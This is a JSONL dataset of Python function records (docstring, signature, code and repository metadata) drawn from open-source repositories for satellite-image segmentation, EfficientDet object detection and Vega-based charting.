{"docstring": "\"\"\"Creates a `ConvReLU` building block.\n\nArgs:\n  num_in: number of input feature maps\n  num_out: number of output feature maps\n\"\"\"\n\n", "func_signal": "def __init__(self, num_in, num_out):\n", "code": "super().__init__()\n\nself.block = nn.Conv2d(num_in, num_out, kernel_size=3, padding=1, bias=False)", "path": "robosat/robosat/unet.py", "commit_date": "2019-05-28 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Removes borders from segmentation probabilities added to the original tile image.\n\nArgs:\n  probs: the segmentation probability mask to remove buffered borders.\n\nReturns:\n  The probability mask with the original tile's dimensions without added overlap borders.\n\"\"\"\n\n", "func_signal": "def unbuffer(self, probs):\n", "code": "o = self.overlap\n_, x, y = probs.shape\n\nreturn probs[:, o : x - o, o : y - o]", "path": "robosat/robosat/datasets.py", "commit_date": "2018-08-08 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Writes a visual representation `.png` file for a binary mask.\n\nArgs:\n  mask: the binary mask to visualize.\n  path: the path to save the `.png` image to.\n\"\"\"\n\n", "func_signal": "def visualize(mask, path):\n", "code": "out = Image.fromarray(mask, mode=\"P\")\nout.putpalette([0, 0, 0, 255, 255, 255])\nout.save(path)", "path": "robosat/robosat/features/core.py", "commit_date": "2019-09-14 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "# at this point all transformations are applied and we expect to work with raw tensors\n", "func_signal": "def __getitem__(self, i):\n", "code": "inputs = [dataset[i] for dataset in self.inputs]\n\nimages = [image for image, _ in inputs]\ntiles = [tile for _, tile in inputs]\n\nmask, mask_tile = self.target[i]\n\nassert len(set(tiles)) == 1, \"all images are for the same tile\"\nassert tiles[0] == mask_tile, \"image tile is the same as label tile\"\n\nif self.joint_transform is not None:\n    images, mask = self.joint_transform(images, mask)\n\nreturn torch.cat(images, dim=0), mask, tiles", "path": "robosat/robosat/datasets.py", "commit_date": "2018-08-08 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Creates an `JointRandomRotation` instance.\n\nArgs:\n  p: the probability for rotating.\n\"\"\"\n\n", "func_signal": "def __init__(self, p, degree):\n", "code": "self.p = p\n\nmethods = {90: Image.ROTATE_90, 180: Image.ROTATE_180, 270: Image.ROTATE_270}\n\nif degree not in methods.keys():\n    raise NotImplementedError(\"We only support multiple of 90 degree rotations for now\")\n\nself.method = methods[degree]", "path": "robosat/robosat/transforms.py", "commit_date": "2018-06-29 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\"Extracts contours and the relationship between them from a binary mask.\n\nArgs:\n  mask: the binary mask to find contours in.\n\nReturns:\n  The detected contours as a list of points and the contour hierarchy.\n\nNote: the hierarchy can be used to re-construct polygons with holes as one entity.\n\"\"\"\n\n", "func_signal": "def contours(mask):\n", "code": "contours, hierarchy = cv2.findContours(mask, cv2.RETR_TREE, cv2.CHAIN_APPROX_SIMPLE)\nreturn contours, hierarchy", "path": "robosat/robosat/features/core.py", "commit_date": "2019-09-14 00:00:00", "repo_name": "mapbox/robosat", "stars": 1988, "license": "mit", "language": "python", "size": 1381}
{"docstring": "\"\"\" Calls extract_features to extract features, applies final linear layer, and returns logits. \"\"\"\n# Convolution layers\n", "func_signal": "def forward(self, inputs):\n", "code": "P = self.extract_features(inputs)\nreturn P", "path": "EfficientDet.Pytorch/models/efficientnet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"Sets swish function as memory efficient (for training) or standard (for export)\"\"\"\n", "func_signal": "def set_swish(self, memory_efficient=True):\n", "code": "self._swish = MemoryEfficientSwish() if memory_efficient else Swish()\nfor block in self._blocks:\n    block.set_swish(memory_efficient)", "path": "EfficientDet.Pytorch/models/efficientnet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\n    Directly extract features from the backbone+neck\n\"\"\"\n", "func_signal": "def extract_feat(self, img):\n", "code": "x = self.backbone(img)\nx = self.neck(x[-5:])\nreturn x", "path": "EfficientDet.Pytorch/models/efficientdet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\nParameters\n----------\na: (N, 4) ndarray of float\nb: (K, 4) ndarray of float\nReturns\n-------\noverlaps: (N, K) ndarray of overlap between boxes and query_boxes\n\"\"\"\n", "func_signal": "def compute_overlap(a, b):\n", "code": "area = (b[:, 2] - b[:, 0]) * (b[:, 3] - b[:, 1])\n\niw = np.minimum(np.expand_dims(\n    a[:, 2], axis=1), b[:, 2]) - np.maximum(np.expand_dims(a[:, 0], 1), b[:, 0])\nih = np.minimum(np.expand_dims(\n    a[:, 3], axis=1), b[:, 3]) - np.maximum(np.expand_dims(a[:, 1], 1), b[:, 1])\n\niw = np.maximum(iw, 0)\nih = np.maximum(ih, 0)\n\nua = np.expand_dims((a[:, 2] - a[:, 0]) *\n                    (a[:, 3] - a[:, 1]), axis=1) + area - iw * ih\n\nua = np.maximum(ua, np.finfo(float).eps)\n\nintersection = iw * ih\n\nreturn intersection / ua", "path": "EfficientDet.Pytorch/utils/metric.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Compute the average precision, given the recall and precision curves.\nCode originally from https://github.com/rbgirshick/py-faster-rcnn.\n# Arguments\n    recall:    The recall curve (list).\n    precision: The precision curve (list).\n# Returns\n    The average precision as computed in py-faster-rcnn.\n\"\"\"\n# correct AP calculation\n# first append sentinel values at the end\n", "func_signal": "def _compute_ap(recall, precision):\n", "code": "mrec = np.concatenate(([0.], recall, [1.]))\nmpre = np.concatenate(([0.], precision, [0.]))\n\n# compute the precision envelope\nfor i in range(mpre.size - 1, 0, -1):\n    mpre[i - 1] = np.maximum(mpre[i - 1], mpre[i])\n\n# to calculate area under PR curve, look for points\n# where X axis (recall) changes value\ni = np.where(mrec[1:] != mrec[:-1])[0]\n\n# and sum (\\Delta recall) * prec\nap = np.sum((mrec[i + 1] - mrec[i]) * mpre[i + 1])\nreturn ap", "path": "EfficientDet.Pytorch/eval.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Get the detections from the retinanet using the generator.\nThe result is a list of lists such that the size is:\n    all_detections[num_images][num_classes] = detections[num_detections, 4 + num_classes]\n# Arguments\n    dataset         : The generator used to run images through the retinanet.\n    retinanet           : The retinanet to run on the images.\n    score_threshold : The score confidence threshold to use.\n    max_detections  : The maximum number of detections to use per image.\n    save_path       : The path to save the images with visualized detections to.\n# Returns\n    A list of lists containing the detections for each image in the generator.\n\"\"\"\n", "func_signal": "def _get_detections(dataset, model, score_threshold=0.05, max_detections=100, save_path=None):\n", "code": "all_detections = [[None for i in range(\n    dataset.num_classes())] for j in range(len(dataset))]\n\nmodel.eval()\n\nwith torch.no_grad():\n    for index in range(len(dataset)):\n        data = dataset[index]\n        scale = data['scale']\n\n        # run network\n        scores, labels, boxes = model(data['img'].permute(\n            2, 0, 1).cuda().float().unsqueeze(dim=0))\n        scores = scores.cpu().numpy()\n        labels = labels.cpu().numpy()\n        boxes = boxes.cpu().numpy()\n\n        # correct boxes for image scale\n        boxes /= scale\n\n        # select indices which have a score above the threshold\n        indices = np.where(scores > score_threshold)[0]\n        if indices.shape[0] > 0:\n            # select those scores\n            scores = scores[indices]\n\n            # find the order with which to sort the scores\n            scores_sort = np.argsort(-scores)[:max_detections]\n\n            # select detections\n            image_boxes = boxes[indices[scores_sort], :]\n            image_scores = scores[scores_sort]\n            image_labels = labels[indices[scores_sort]]\n            image_detections = np.concatenate([image_boxes, np.expand_dims(\n                image_scores, axis=1), np.expand_dims(image_labels, axis=1)], axis=1)\n\n            # copy detections to all_detections\n            for label in range(dataset.num_classes()):\n                all_detections[index][label] = image_detections[image_detections[:, -1] == label, :-1]\n        else:\n            # copy detections to all_detections\n            for label in range(dataset.num_classes()):\n                all_detections[index][label] = np.zeros((0, 5))\n\n        print('{}/{}'.format(index + 1, len(dataset)), end='\\r')\n\nreturn all_detections", "path": "EfficientDet.Pytorch/utils/metric.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "'''Freeze BatchNorm layers.'''\n", "func_signal": "def freeze_bn(self):\n", "code": "for layer in self.modules():\n    if isinstance(layer, nn.BatchNorm2d):\n        layer.eval()", "path": "EfficientDet.Pytorch/models/efficientdet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Compute the average precision, given the recall and precision curves.\nCode originally from https://github.com/rbgirshick/py-faster-rcnn.\n# Arguments\n    recall:    The recall curve (list).\n    precision: The precision curve (list).\n# Returns\n    The average precision as computed in py-faster-rcnn.\n\"\"\"\n# correct AP calculation\n# first append sentinel values at the end\n", "func_signal": "def _compute_ap(recall, precision):\n", "code": "mrec = np.concatenate(([0.], recall, [1.]))\nmpre = np.concatenate(([0.], precision, [0.]))\n\n# compute the precision envelope\nfor i in range(mpre.size - 1, 0, -1):\n    mpre[i - 1] = np.maximum(mpre[i - 1], mpre[i])\n\n# to calculate area under PR curve, look for points\n# where X axis (recall) changes value\ni = np.where(mrec[1:] != mrec[:-1])[0]\n\n# and sum (\\Delta recall) * prec\nap = np.sum((mrec[i + 1] - mrec[i]) * mpre[i + 1])\nreturn ap", "path": "EfficientDet.Pytorch/utils/metric.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "# load class names (name -> label)\n", "func_signal": "def load_classes(self):\n", "code": "categories = self.coco.loadCats(self.coco.getCatIds())\ncategories.sort(key=lambda x: x['id'])\n\nself.classes = {}\nself.coco_labels = {}\nself.coco_labels_inverse = {}\nfor c in categories:\n    self.coco_labels[len(self.classes)] = c['id']\n    self.coco_labels_inverse[c['id']] = len(self.classes)\n    self.classes[c['name']] = len(self.classes)\n\n# also load the reverse (label -> name)\nself.labels = {}\nfor key, value in self.classes.items():\n    self.labels[value] = key", "path": "EfficientDet.Pytorch/datasets/coco.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Get the ground truth annotations from the generator.\nThe result is a list of lists such that the size is:\n    all_detections[num_images][num_classes] = annotations[num_detections, 5]\n# Arguments\n    generator : The generator used to retrieve ground truth annotations.\n# Returns\n    A list of lists containing the annotations for each image in the generator.\n\"\"\"\n", "func_signal": "def _get_annotations(generator):\n", "code": "all_annotations = [[None for i in range(\n    generator.num_classes())] for j in range(len(generator))]\n\nfor i in range(len(generator)):\n    # load the annotations\n    annotations = generator.load_annotations(i)\n\n    # copy detections to all_annotations\n    for label in range(generator.num_classes()):\n        all_annotations[i][label] = annotations[annotations[:, 4]\n                                                == label, :4].copy()\n\n    print('{}/{}'.format(i + 1, len(generator)), end='\\r')\n\nreturn all_annotations", "path": "EfficientDet.Pytorch/utils/metric.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Get the detections from the retinanet using the generator.\nThe result is a list of lists such that the size is:\n    all_detections[num_images][num_classes] = detections[num_detections, 4 + num_classes]\n# Arguments\n    dataset         : The generator used to run images through the retinanet.\n    retinanet           : The retinanet to run on the images.\n    score_threshold : The score confidence threshold to use.\n    max_detections  : The maximum number of detections to use per image.\n    save_path       : The path to save the images with visualized detections to.\n# Returns\n    A list of lists containing the detections for each image in the generator.\n\"\"\"\n", "func_signal": "def _get_detections(dataset, retinanet, score_threshold=0.05, max_detections=100, save_path=None):\n", "code": "all_detections = [[None for i in range(\n    dataset.num_classes())] for j in range(len(dataset))]\n\nretinanet.eval()\n\nwith torch.no_grad():\n\n    for index in range(len(dataset)):\n        data = dataset[index]\n        scale = data['scale']\n\n        # run network\n        scores, labels, boxes = retinanet(data['img'].permute(\n            2, 0, 1).cuda().float().unsqueeze(dim=0))\n        scores = scores.cpu().numpy()\n        labels = labels.cpu().numpy()\n        boxes = boxes.cpu().numpy()\n\n        # correct boxes for image scale\n        boxes /= scale\n\n        # select indices which have a score above the threshold\n        indices = np.where(scores > score_threshold)[0]\n        if indices.shape[0] > 0:\n            # select those scores\n            scores = scores[indices]\n\n            # find the order with which to sort the scores\n            scores_sort = np.argsort(-scores)[:max_detections]\n\n            # select detections\n            image_boxes = boxes[indices[scores_sort], :]\n            image_scores = scores[scores_sort]\n            image_labels = labels[indices[scores_sort]]\n            image_detections = np.concatenate([image_boxes, np.expand_dims(\n                image_scores, axis=1), np.expand_dims(image_labels, axis=1)], axis=1)\n\n            # copy detections to all_detections\n            for label in range(dataset.num_classes()):\n                all_detections[index][label] = image_detections[image_detections[:, -1] == label, :-1]\n        else:\n            # copy detections to all_detections\n            for label in range(dataset.num_classes()):\n                all_detections[index][label] = np.zeros((0, 5))\n\n        print('{}/{}'.format(index + 1, len(dataset)), end='\\r')\n\nreturn all_detections", "path": "EfficientDet.Pytorch/eval.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\nArgs:\n    root_dir (string): COCO directory.\n    transform (callable, optional): Optional transform to be applied\n        on a sample.\n\"\"\"\n", "func_signal": "def __init__(self, root_dir, set_name='train2017', transform=None):\n", "code": "self.root_dir = root_dir\nself.set_name = set_name\nself.transform = transform\n\nself.coco = COCO(os.path.join(self.root_dir, 'annotations',\n                              'instances_' + self.set_name + '.json'))\nself.image_ids = self.coco.getImgIds()\n\nself.load_classes()", "path": "EfficientDet.Pytorch/datasets/coco.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\nParameters\n----------\na: (N, 4) ndarray of float\nb: (K, 4) ndarray of float\nReturns\n-------\noverlaps: (N, K) ndarray of overlap between boxes and query_boxes\n\"\"\"\n", "func_signal": "def compute_overlap(a, b):\n", "code": "area = (b[:, 2] - b[:, 0]) * (b[:, 3] - b[:, 1])\n\niw = np.minimum(np.expand_dims(\n    a[:, 2], axis=1), b[:, 2]) - np.maximum(np.expand_dims(a[:, 0], 1), b[:, 0])\nih = np.minimum(np.expand_dims(\n    a[:, 3], axis=1), b[:, 3]) - np.maximum(np.expand_dims(a[:, 1], 1), b[:, 1])\n\niw = np.maximum(iw, 0)\nih = np.maximum(ih, 0)\n\nua = np.expand_dims((a[:, 2] - a[:, 0]) *\n                    (a[:, 3] - a[:, 1]), axis=1) + area - iw * ih\n\nua = np.maximum(ua, np.finfo(float).eps)\n\nintersection = iw * ih\n\nreturn intersection / ua", "path": "EfficientDet.Pytorch/eval.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Validates model name. None that pretrained weights are only available for\nthe first four models (efficientnet-b{i} for i in 0,1,2,3) at the moment. \"\"\"\n", "func_signal": "def _check_model_name_is_valid(cls, model_name, also_need_pretrained_weights=False):\n", "code": "num_models = 4 if also_need_pretrained_weights else 8\nvalid_models = ['efficientnet-b'+str(i) for i in range(num_models)]\nif model_name not in valid_models:\n    raise ValueError('model_name should be one of: ' +\n                     ', '.join(valid_models))", "path": "EfficientDet.Pytorch/models/efficientnet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "# get ground truth annotations\n", "func_signal": "def load_annotations(self, image_index):\n", "code": "annotations_ids = self.coco.getAnnIds(\n    imgIds=self.image_ids[image_index], iscrowd=False)\nannotations = np.zeros((0, 5))\n\n# some images appear to miss annotations (like image with id 257034)\nif len(annotations_ids) == 0:\n    return annotations\n\n# parse annotations\ncoco_annotations = self.coco.loadAnns(annotations_ids)\nfor idx, a in enumerate(coco_annotations):\n\n    # some annotations have basically no width / height, skip them\n    if a['bbox'][2] < 1 or a['bbox'][3] < 1:\n        continue\n\n    annotation = np.zeros((1, 5))\n    annotation[0, :4] = a['bbox']\n    annotation[0, 4] = self.coco_label_to_label(a['category_id'])\n    annotations = np.append(annotations, annotation, axis=0)\n\n# transform from [x, y, w, h] to [x1, y1, x2, y2]\nannotations[:, 2] = annotations[:, 0] + annotations[:, 2]\nannotations[:, 3] = annotations[:, 1] + annotations[:, 3]\n\nreturn annotations", "path": "EfficientDet.Pytorch/datasets/coco.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\n:param inputs: input tensor\n:param drop_connect_rate: drop connect rate (float, between 0 and 1)\n:return: output of block\n\"\"\"\n\n# Expansion and Depthwise Convolution\n", "func_signal": "def forward(self, inputs, drop_connect_rate=None):\n", "code": "x = inputs\nif self._block_args.expand_ratio != 1:\n    x = self._swish(self._bn0(self._expand_conv(inputs)))\n\nx = self._swish(self._bn1(self._depthwise_conv(x)))\n\n# Squeeze and Excitation\nif self.has_se:\n    x_squeezed = F.adaptive_avg_pool2d(x, 1)\n    x_squeezed = self._se_expand(\n        self._swish(self._se_reduce(x_squeezed)))\n    x = torch.sigmoid(x_squeezed) * x\n\nx = self._bn2(self._project_conv(x))\n\n# Skip connection and drop connect\ninput_filters, output_filters = self._block_args.input_filters, self._block_args.output_filters\nif self.id_skip and self._block_args.stride == 1 and input_filters == output_filters:\n    if drop_connect_rate:\n        x = drop_connect(x, p=drop_connect_rate,\n                         training=self.training)\n    x = x + inputs  # skip connection\nreturn x", "path": "EfficientDet.Pytorch/models/efficientnet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\nIf visualization is configured to use:\n    return add_data() methods of tensorboard with additional information (step, tag) added.\nOtherwise:\n    return a blank function handle that does nothing\n\"\"\"\n", "func_signal": "def __getattr__(self, name):\n", "code": "if name in self.tb_writer_ftns:\n    add_data = getattr(self.writer, name, None)\n\n    def wrapper(tag, data, *args, **kwargs):\n        if add_data is not None:\n            # add mode(train/valid) tag\n            if name not in self.tag_mode_exceptions:\n                tag = '{}/{}'.format(tag, self.mode)\n            add_data(tag, data, self.step, *args, **kwargs)\n    return wrapper\nelse:\n    # default action for returning methods defined in this class, set_step() for instance.\n    try:\n        attr = object.__getattr__(name)\n    except AttributeError:\n        raise AttributeError(\"type object '{}' has no attribute '{}'\".format(\n            self.selected_module, name))\n    return attr", "path": "EfficientDet.Pytorch/utils/visualization.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Get the ground truth annotations from the generator.\nThe result is a list of lists such that the size is:\n    all_detections[num_images][num_classes] = annotations[num_detections, 5]\n# Arguments\n    generator : The generator used to retrieve ground truth annotations.\n# Returns\n    A list of lists containing the annotations for each image in the generator.\n\"\"\"\n", "func_signal": "def _get_annotations(generator):\n", "code": "all_annotations = [[None for i in range(\n    generator.num_classes())] for j in range(len(generator))]\n\nfor i in range(len(generator)):\n    # load the annotations\n    annotations = generator.load_annotations(i)\n\n    # copy detections to all_annotations\n    for label in range(generator.num_classes()):\n        all_annotations[i][label] = annotations[annotations[:, 4]\n                                                == label, :4].copy()\n\n    print('{}/{}'.format(i + 1, len(generator)), end='\\r')\n\nreturn all_annotations", "path": "EfficientDet.Pytorch/eval.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\" Returns output of the final convolution layer \"\"\"\n# Stem\n", "func_signal": "def extract_features(self, inputs):\n", "code": "x = self._swish(self._bn0(self._conv_stem(inputs)))\n\nP = []\nindex = 0\nnum_repeat = 0\n# Blocks\nfor idx, block in enumerate(self._blocks):\n    drop_connect_rate = self._global_params.drop_connect_rate\n    if drop_connect_rate:\n        drop_connect_rate *= float(idx) / len(self._blocks)\n    x = block(x, drop_connect_rate=drop_connect_rate)\n    num_repeat = num_repeat + 1\n    if(num_repeat == self._blocks_args[index].num_repeat):\n        num_repeat = 0\n        index = index + 1\n        P.append(x)\nreturn P", "path": "EfficientDet.Pytorch/models/efficientnet.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"\nArguments:\n    target (annotation) : the target annotation to be made usable\n        will be an ET.Element\nReturns:\n    a list containing lists of bounding boxes  [bbox coords, class name]\n\"\"\"\n", "func_signal": "def __call__(self, target, width, height):\n", "code": "res = []\nfor obj in target.iter('object'):\n    difficult = int(obj.find('difficult').text) == 1\n    if not self.keep_difficult and difficult:\n        continue\n    name = obj.find('name').text.lower().strip()\n    bbox = obj.find('bndbox')\n\n    pts = ['xmin', 'ymin', 'xmax', 'ymax']\n    bndbox = []\n    for i, pt in enumerate(pts):\n        cur_pt = float(bbox.find(pt).text) - 1\n        # scale height or width\n        # cur_pt = cur_pt / width if i % 2 == 0 else cur_pt / height\n        bndbox.append(cur_pt)\n    label_idx = self.class_to_ind[name]\n    bndbox.append(label_idx)\n    res += [bndbox]  # [xmin, ymin, xmax, ymax, label_ind]\n    # img_id = target.find('filename').text[:-4]\n\nreturn res  # [[xmin, ymin, xmax, ymax, label_ind], ... ]", "path": "EfficientDet.Pytorch/datasets/voc0712.py", "commit_date": "2020-01-07 00:00:00", "repo_name": "toandaominh1997/EfficientDet.Pytorch", "stars": 1430, "license": "mit", "language": "python", "size": 11478}
{"docstring": "\"\"\"Iterate through each chart element for check for contents\"\"\"\n\n", "func_signal": "def chart_runner(chart, scales, axes, marks):\n", "code": "for i, scale in enumerate(scales):\n    nt.assert_dict_equal(chart.scales[i].grammar(), scale)\n\nfor i, axis in enumerate(axes):\n    nt.assert_dict_equal(chart.axes[i].grammar(), axis)\n\nfor i, mark in enumerate(marks):\n    nt.assert_dict_equal(chart.marks[i].grammar(), mark)", "path": "vincent/tests/test_charts.py", "commit_date": "2014-04-11 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"list or KeyedList of ``Scale`` : Scale definitions\n\nScales map the data from the domain of the data to some\nvisualization space (such as an x-axis). See the :class:`Scale`\nclass for details.\n\"\"\"\n", "func_signal": "def scales(value):\n", "code": "for i, entry in enumerate(value):\n    _assert_is_type('scales[{0}]'.format(i), entry, Scale)", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"list or KeyedList of ``Legends`` : Legend definitions\n\nLegends visualize scales, and take one or more scales as their input.\nThey can be customized via a LegendProperty object.\n\"\"\"\n", "func_signal": "def legends(value):\n", "code": "for i, entry in enumerate(value):\n    _assert_is_type('legends[{0}]'.format(i), entry, Legend)", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Validate the visualization contents.\n\nParameters\n----------\nrequire_all : boolean, default True\n    If True (default), then all fields ``data``, ``scales``,\n    ``axes``, and ``marks`` must be defined. The user is allowed to\n    disable this if the intent is to define the elements\n    client-side.\n\nIf the contents of the visualization are not valid Vega, then a\n:class:`ValidationError` is raised.\n\"\"\"\n", "func_signal": "def validate(self, require_all=True, scale='colors'):\n", "code": "super(self.__class__, self).validate()\nrequired_attribs = ('data', 'scales', 'axes', 'marks')\nfor elem in required_attribs:\n    attr = getattr(self, elem)\n    if attr:\n        # Validate each element of the sets of data, etc\n        for entry in attr:\n            entry.validate()\n        names = [a.name for a in attr]\n        if len(names) != len(set(names)):\n            raise ValidationError(elem + ' has duplicate names')\n    elif require_all:\n        raise ValidationError(\n            elem + ' must be defined for valid visualization')", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Display the visualization inline in the IPython notebook.\n\nThis is deprecated, use the following instead::\n\n    from IPython.display import display\n    display(viz)\n\"\"\"\n", "func_signal": "def display(self):\n", "code": "from IPython.core.display import display, HTML\ndisplay(HTML(self._repr_html_()))", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"list or KeyedList of ``Mark`` : Mark definitions\n\nMarks are the visual objects (such as lines, bars, etc.) that\nrepresent the data in the visualization space. See the :class:`Mark`\nclass for details.\n\"\"\"\n", "func_signal": "def marks(value):\n", "code": "for i, entry in enumerate(value):\n    _assert_is_type('marks[{0}]'.format(i), entry, Mark)", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"int or dict : Padding around visualization\n\nThe padding defines the distance between the edge of the\nvisualization canvas to the visualization box. It does not count as\npart of the visualization width/height. Values cannot be negative.\n\nIf a dict, padding must have all keys ``''top'``, ``'left'``,\n``'right'``, and ``'bottom'`` with int values.\n\"\"\"\n", "func_signal": "def padding(value):\n", "code": "if isinstance(value, dict):\n    required_keys = ['top', 'left', 'right', 'bottom']\n    for key in required_keys:\n        if key not in value:\n            error = ('Padding must have keys \"{0}\".'\n                     .format('\", \"'.join(required_keys)))\n            raise ValueError(error)\n        _assert_is_type('padding: {0}'.format(key), value[key], int)\n        if value[key] < 0:\n            raise ValueError('Padding cannot be negative.')\nelif isinstance(value, int):\n    if value < 0:\n        raise ValueError('Padding cannot be negative.')\nelse:\n    if value not in (\"auto\", \"strict\"):\n        raise ValueError('Padding can only be auto or strict.')", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Set AxisProperties and PropertySets\"\"\"\n", "func_signal": "def _set_axis_properties(self, axis):\n", "code": "if not getattr(axis, 'properties'):\n    axis.properties = AxisProperties()\n    for prop in ['ticks', 'axis', 'major_ticks', 'minor_ticks',\n                 'title', 'labels']:\n        setattr(axis.properties, prop, PropertySet())", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Convience method for adding a legend to the figure.\n\nImportant: This defaults to the color scale that is generated with\nLine, Area, Stacked Line, etc charts. For bar charts, the scale ref is\nusually 'y'.\n\nParameters\n----------\ntitle: string, default None\n    Legend Title\nscale: string, default 'color'\n    Scale reference for legend\ntext_color: str, default None\n    Title and label color\n\"\"\"\n\n", "func_signal": "def legend(self, title=None, scale='color', text_color=None):\n", "code": "self.legends.append(Legend(title=title, fill=scale, offset=0,\n                           properties=LegendProperties()))\nif text_color:\n    color_props = PropertySet(fill=ValueRef(value=text_color))\n    self.legends[0].properties.labels = color_props\n    self.legends[0].properties.title = color_props\nreturn self", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
{"docstring": "\"\"\"Set axis ticks, title, labels to given color\"\"\"\n", "func_signal": "def _set_all_axis_color(self, axis, color):\n", "code": "for prop in ['ticks', 'axis', 'major_ticks', 'minor_ticks', 'title',\n             'labels']:\n    prop_set = getattr(axis.properties, prop)\n    if color and prop in ['title', 'labels']:\n        prop_set.fill = ValueRef(value=color)\n    elif color and prop in ['axis', 'major_ticks', 'minor_ticks',\n                            'ticks']:\n        prop_set.stroke = ValueRef(value=color)", "path": "vincent/vincent/visualization.py", "commit_date": "2014-04-17 00:00:00", "repo_name": "wrobstory/vincent", "stars": 2040, "license": "mit", "language": "python", "size": 7081}
